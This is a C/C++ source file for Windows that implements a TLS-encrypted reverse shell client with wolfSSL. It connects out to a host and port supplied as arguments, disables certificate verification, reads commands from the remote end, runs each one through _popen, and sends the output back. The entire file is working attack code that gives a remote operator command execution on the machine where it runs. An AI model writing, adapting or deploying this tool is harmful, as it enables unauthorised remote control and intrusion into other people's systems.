#define _WINSOCK_DEPRECATED_NO_WARNINGS
#define _CRT_SECURE_NO_WARNINGS

#include <winsock2.h>
#include <ws2tcpip.h>
#include <stdio.h>
#include <string.h>

#ifdef HAVE_CONFIG_H
#include <config.h>
#endif

#include <wolfssl/ssl.h> /* name change portability layer */
#include <wolfssl/wolfcrypt/settings.h>
#ifdef HAVE_ECC
#include <wolfssl/wolfcrypt/ecc.h>   /* ecc_fp_free */
#endif

#define DEFAULT_BUFLEN 512
#define FAIL    -1

SOCKET OpenConnection(char* hostname, char* port)
{
    WSADATA wsaData;
    SOCKET ConnectSocket = INVALID_SOCKET;
    struct addrinfo* result = NULL;
    struct addrinfo* ptr = NULL;
    struct addrinfo hints;
    char recvbuf[DEFAULT_BUFLEN];
    int iResult;
    int recvbuflen = DEFAULT_BUFLEN;

    // Initialize Winsock
    iResult = WSAStartup(MAKEWORD(2, 2), &wsaData);
    if (iResult != 0) {
        printf("WSAStartup failed with error: %d\n", iResult);
        return 1;
    }

    ZeroMemory(&hints, sizeof(hints));
    hints.ai_family = AF_UNSPEC;
    hints.ai_socktype = SOCK_STREAM;
    hints.ai_protocol = IPPROTO_TCP;

    // Resolve the server address and port
    iResult = getaddrinfo(hostname, port, &hints, &result);
    if (iResult != 0) {
        printf("getaddrinfo failed with error: %d\n", iResult);
        WSACleanup();
        return 1;
    }
    ptr = result;
    // Create a SOCKET for connecting to server
    ConnectSocket = WSASocketW(ptr->ai_family, ptr->ai_socktype, ptr->ai_protocol, NULL, 0, 0);
    if (ConnectSocket == INVALID_SOCKET) {
        printf("socket failed with error: %ld\n", WSAGetLastError());
        WSACleanup();
        return 1;
    }

    // Connect to server.
    iResult = connect(ConnectSocket, ptr->ai_addr, (int)ptr->ai_addrlen);
    if (iResult == SOCKET_ERROR) {
        closesocket(ConnectSocket);
        ConnectSocket = INVALID_SOCKET;
    }

    return ConnectSocket;
}


SSL_CTX* InitCTX(void)
{
    OpenSSL_add_all_algorithms();  /* Load cryptos, et.al. */
    SSL_load_error_strings();   /* Bring in and register error messages */
    const SSL_METHOD* method = TLSv1_2_client_method();  /* Create new client-method instance */
    SSL_CTX* ctx = SSL_CTX_new(method);   /* Create new context */
    if (ctx == NULL)
    {
        ERR_print_errors_fp(stderr);
        abort();
    }
    return ctx;
}


void ShowCerts(SSL* ssl)
{
    X509* cert;
    char* line;
    cert = SSL_get_peer_certificate(ssl); /* get the server's certificate */
    if (cert != NULL)
    {
        printf("Server certificates:\n");
        line = X509_NAME_oneline(X509_get_subject_name(cert), 0, 0);
        printf("Subject: %s\n", line);
        line = X509_NAME_oneline(X509_get_issuer_name(cert), 0, 0);
        printf("Issuer: %s\n", line);
        X509_free(cert);     /* free the malloc'ed certificate copy */
    }
    else
        printf("Info: No client certificates configured.\n");
}

void execute(SSL* ssl, char* cmdline) {

    FILE* pipe;
    const char* endstring = " 2>&1";
    strncat(cmdline, endstring, strlen(endstring));
    pipe = _popen(cmdline, "r");
    char buffer[128] = { 0 };

    if (!pipe) {
        puts("popen() failed!");
    }
    try {
        // read till end of process:
        while (fgets(buffer, sizeof(buffer), pipe) != NULL) {
            SSL_write(ssl, buffer, strlen(buffer));
        }
        _pclose(pipe);
    }
    catch (...) {
        _pclose(pipe);
        throw;
    }
}

int main(int argc, char* argv[])
{
    char buf[1024] = { 0 };
    SSL_library_init();
    char *hostname = argv[1]; // change this
    char *portnum = argv[2]; // change this

    SSL_CTX* ctx = InitCTX();
    wolfSSL_CTX_set_verify(ctx, WOLFSSL_VERIFY_NONE, NULL);
    SOCKET server = OpenConnection(hostname, portnum);
    SSL* ssl = SSL_new(ctx);      /* create new SSL connection state */
    SSL_set_fd(ssl, server);    /* attach the socket descriptor */

    if (SSL_connect(ssl) == FAIL) {
        ERR_print_errors_fp(stderr);
    }
    else {
        const char* cpRequestMessage = "";

        printf("\n\nConnected with %s encryption\n", SSL_get_cipher(ssl));

        /* get any certs */
        ShowCerts(ssl);

        while (1) {
            /* get reply & decrypt */
            const char* startupchar = ">";
            SSL_write(ssl, startupchar, strlen(startupchar));
            int bytes = SSL_read(ssl, buf, sizeof(buf));
            buf[bytes - 1] = 0;

            if (strstr(buf, "exit")) {
                break;
            }
            /* encrypt & send message */
            execute(ssl, buf);
        }

        /* release connection state */
        puts("finish");

        SSL_free(ssl);
    }

    /* close socket */
    closesocket(server);
    /* release context */
    SSL_CTX_free(ctx);
    return 0;
}
